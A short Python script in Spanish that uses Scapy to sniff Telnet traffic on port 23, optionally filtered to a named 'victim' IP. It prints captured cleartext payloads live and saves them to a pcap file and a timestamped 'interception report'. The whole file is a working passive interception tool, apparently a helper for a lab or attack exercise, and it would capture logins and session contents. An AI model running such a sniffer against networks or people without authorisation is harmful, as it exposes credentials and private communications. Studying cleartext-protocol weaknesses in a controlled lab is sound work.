#!/usr/bin/env python3
from scapy.all import sniff, wrpcap, IP, TCP, Raw
import sys
import time
import datetime

def formatear_hora(timestamp):
    try:
        dt = datetime.datetime.fromtimestamp(timestamp)
        return dt.strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    except:
        return str(timestamp)

if len(sys.argv) < 5:
    print("Uso: python3 sniffer_aux.py <interfaz> <tiempo> <archivo_pcap> <archivo_txt> [victim_ip]")
    sys.exit(1)

iface = sys.argv[1]
tiempo = int(sys.argv[2])
archivo_pcap = sys.argv[3]
archivo_txt = sys.argv[4]
victim_ip = sys.argv[5] if len(sys.argv) > 5 else ""

# Filtro específico para Telnet (Puerto 23)
# Si hay IP de víctima, filtramos por esa IP AND puerto 23
filtro_bpf = "tcp port 23"
if victim_ip:
    filtro_bpf += f" and host {victim_ip}"

paquetes = []

def procesar_paquete(pkt):
    if pkt.haslayer(Raw): # Solo guardamos si trae datos (mensajes)
        paquetes.append(pkt)
        # Imprimir en tiempo real para ver la magia
        try:
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            if payload.strip():
                print(f"[TELNET DATA]: {payload.strip()}")
        except:
            pass

print(f"🚀 Iniciando Sniffer Telnet en {iface}...")
sniff(iface=iface, timeout=tiempo, filter=filtro_bpf, prn=procesar_paquete, store=False)

# Guardar resultados
wrpcap(archivo_pcap, paquetes)

with open(archivo_txt, 'w', encoding='utf-8') as txt:
    txt.write(f"--- REPORTE INTERCEPCIÓN TELNET ---\n")
    for pkt in paquetes:
        raw_data = pkt[Raw].load.decode('utf-8', errors='ignore')
        txt.write(f"[{formatear_hora(pkt.time)}] {pkt[IP].src} -> {pkt[IP].dst}: {raw_data}\n")

print(f"\n✅ Captura finalizada. Datos en {archivo_txt}")